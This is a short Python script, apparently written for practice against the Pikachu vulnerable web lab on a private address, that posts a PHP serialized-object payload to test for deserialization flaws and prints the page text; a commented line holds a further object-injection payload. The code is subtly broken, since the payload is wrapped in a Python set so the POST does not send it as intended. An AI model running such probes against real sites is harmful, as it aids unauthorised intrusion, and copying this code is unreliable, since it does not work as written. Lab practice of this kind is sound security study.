#-*- coding:utf-8 -*-
import bs4
import requests


def PHP_Dvul(url, payload):
    # 构造恶意的序列化数据
    serialized_payload = {'o', payload}
    session2 = requests.Session()
    ret= session2.get(url)
    ret.encoding = 'UTF-8'
    Soup2 = bs4.BeautifulSoup(ret.text, 'lxml')
    print(Soup2.text.replace(" ", '').replace("\n", '').replace('\t', ''))
    # 发送请求并观察响应
    session1 = requests.Session()
    response = session1.post(url, data=serialized_payload)
    response.encoding = 'UTF-8'
    Soup = bs4.BeautifulSoup(response.text, 'lxml')
    print(Soup.text.replace(" ", '').replace("\n", '').replace('\t', ''))
    # 检查响应中是否存在反序列化漏洞的迹象
    # if 'phpvul' in response.text:
    #     print("该网址存在 PHP 反序列化漏洞！")
    # else:
    #     print("该网址没有 PHP 反序列化漏洞。")


# 调用函数进行测试
# O:11:"SomeClass":1:{s:13:"__serialize";s:39:";s:10:\"\x00*\x00callback\";s:11:\"vulnerablity\";";}

if __name__ == "__main__":
    url = 'http://192.168.249.131/pikachu/vul/unserilization/unser.php'
    payload = 'O:1:"S":1:{s:4:"test";s:6:"phpvul";}'
    PHP_Dvul(url, payload)
